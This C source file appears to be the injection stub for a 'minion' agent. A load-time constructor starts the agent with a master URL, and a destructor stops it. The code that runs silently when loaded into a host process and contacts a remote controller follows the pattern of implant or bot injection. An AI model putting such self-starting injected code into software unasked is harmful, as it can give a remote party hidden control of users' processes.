#include <stdlib.h>

#include "minion.h"
#include "main_config.h"


void __attribute__ ((constructor)) _start(void);
void __attribute__ ((destructor)) _stop(void);

minion_context_t ctx;

void _start()
{
    minion_context_init(&ctx);
    ctx.file_name =     MINION_BOOT_FILE_NAME;
    ctx.master_url =    MINION_MASTER_URL;
    ctx.log_prefix =    "minion-injected";

    minion_start(&ctx);
}

void _stop()
{    
    minion_stop(&ctx);
}